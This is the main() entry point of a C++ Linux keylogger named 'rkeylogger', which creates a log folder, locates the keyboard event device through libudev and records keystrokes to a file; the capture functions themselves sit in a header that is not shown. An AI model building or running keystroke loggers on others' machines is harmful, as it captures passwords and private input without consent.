#include "rkeylogger.h"
#include <iostream>

int main() {
    if(!create_rkeylogger_folder()){
        std::cerr << "[ ERROR ]: Error, cannot create folder to save the logged file" << "\n";
        return EXIT_FAILURE;
    }

    std::string devnode = guess_input_file();
    if(devnode.empty()){
        std::cerr << "[ ERROR ]: Cannot use libudev.h" << std::endl;
        return EXIT_FAILURE;
    }
    
    std::cout << "[ LOG ]: Use the following keyboard event path: " << devnode << "\n";

    if(!read_input_file(devnode.c_str())){
        std::cout << "[ ERROR ]: Cannot open the file (probably a permission problem)" << std::endl;
        return EXIT_FAILURE;
    }

    close_lastfile();
    std::cout << "[ LOG ]: Logging keyboard finished with success !!" << std::endl;
    return EXIT_SUCCESS;
}